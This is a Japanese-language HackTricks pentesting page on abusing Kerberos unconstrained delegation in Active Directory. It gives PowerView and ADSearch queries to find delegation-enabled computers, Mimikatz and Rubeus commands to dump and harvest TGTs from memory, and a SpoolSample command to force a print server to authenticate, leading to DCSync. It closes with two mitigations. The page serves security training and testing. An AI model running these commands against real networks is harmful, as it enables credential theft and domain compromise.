# Unconstrained Delegation

{{#include ../../banners/hacktricks-training.md}}

## Unconstrained delegation

これは、ドメイン管理者がドメイン内の任意の**コンピュータ**に設定できる機能です。次に、**ユーザーがコンピュータにログイン**すると、そのユーザーの**TGTのコピー**がDCによって提供される**TGS内に送信され**、**LSASSのメモリに保存されます**。したがって、マシン上で管理者権限を持っている場合、**チケットをダンプしてユーザーを偽装する**ことができます。

したがって、ドメイン管理者が「Unconstrained Delegation」機能が有効なコンピュータにログインし、そのマシン内でローカル管理者権限を持っている場合、チケットをダンプしてドメイン管理者をどこでも偽装することができます（ドメイン特権昇格）。

この属性を持つコンピュータオブジェクトを**見つける**には、[userAccountControl](<https://msdn.microsoft.com/en-us/library/ms680832(v=vs.85).aspx>)属性が[ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>)を含んでいるかどうかを確認します。これは、‘(userAccountControl:1.2.840.113556.1.4.803:=524288)’というLDAPフィルターを使用して行うことができ、これがpowerviewが行うことです：

<pre class="language-bash"><code class="lang-bash"># List unconstrained computers
## Powerview
Get-NetComputer -Unconstrained #DCs always appear but aren't useful for privesc
<strong>## ADSearch
</strong>ADSearch.exe --search "(&#x26;(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" --attributes samaccountname,dnshostname,operatingsystem
<strong># Export tickets with Mimikatz
</strong>privilege::debug
sekurlsa::tickets /export #Recommended way
kerberos::list /export #Another way

# Monitor logins and export new tickets
.\Rubeus.exe monitor /targetuser:&#x3C;username> /interval:10 #Check every 10s for new TGTs</code></pre>

**Mimikatz**または**Rubeus**を使用して、メモリ内の管理者（または被害者ユーザー）のチケットをロードします。**[**Pass the Ticket**](pass-the-ticket.md)**。\
詳細情報：[https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/](https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/)\
[**Unconstrained delegationに関する詳細情報はired.teamをご覧ください。**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-unrestricted-kerberos-delegation)

### **Force Authentication**

攻撃者が「Unconstrained Delegation」を許可されたコンピュータを**侵害することができれば**、**Print server**を**自動的にログイン**させて**TGTをメモリに保存**させることができます。\
その後、攻撃者は**Pass the Ticket攻撃を実行して**ユーザーのPrint serverコンピュータアカウントを偽装することができます。

Print serverを任意のマシンにログインさせるには、[**SpoolSample**](https://github.com/leechristensen/SpoolSample)を使用できます：
```bash
.\SpoolSample.exe <printmachine> <unconstrinedmachine>
```
TGTがドメインコントローラーからのものであれば、[ **DCSync attack**](acl-persistence-abuse/index.html#dcsync)を実行して、DCからすべてのハッシュを取得することができます。\
[**この攻撃に関する詳細はired.teamで。**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-dc-print-server-and-kerberos-delegation)

**認証を強制するための他の方法は次のとおりです：**

{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

### Mitigation

- DA/Adminのログインを特定のサービスに制限する
- 特権アカウントに対して「アカウントは機密であり、委任できない」を設定する。

{{#include ../../banners/hacktricks-training.md}}
